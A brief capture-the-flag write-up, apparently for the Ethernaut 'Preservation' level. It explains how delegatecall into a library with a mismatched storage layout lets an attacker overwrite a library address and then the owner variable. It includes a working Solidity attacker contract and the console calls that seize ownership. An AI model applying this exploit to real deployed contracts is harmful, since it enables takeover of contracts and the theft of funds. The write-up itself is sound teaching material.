#PRESERVATION

##Objective:  to become the owner of the contract .

##analysis: 

PreservationContract : 
intial two variables contain address for the libararies , and the latter is the owner where we need to store our address.
the only part we can control here is the param uint _timeStamp as the addresses mentioned before are predefined in the constructor and cannot be changed.

LibraryContract: 
function setTime() takes in an input from us and stores in storedTime in slot 0 , which is inturn mapped to the variable timeZone1Library in preservation contract.


##vulnerability  : 
👉 The storage layout in Preservation and LibraryContract are different.
Preservation calls LibraryContract.setTime() using delegatecall.
LibraryContract.setTime() is writing to slot 0, and in Preservation slot 0 is timeZone1Library, it ends up overwriting timeZone1Library instead of just storing a time

write a contract which have same storage layout as Preservation and a different  setTime function.

##exploit :
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationHackContract {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}

await contract.setFirstTime("contract address of PreservationHack")
This will use delegatecall to call LibraryContract.setTime()
but since the function is in PreservationHack , it runs setTime.

await contract.setFirstTime(1)
since delegatecall runs PreservationHack.setTime(1), and that sets owner = msg.sender, the owner of the Preservation contract is us.
```


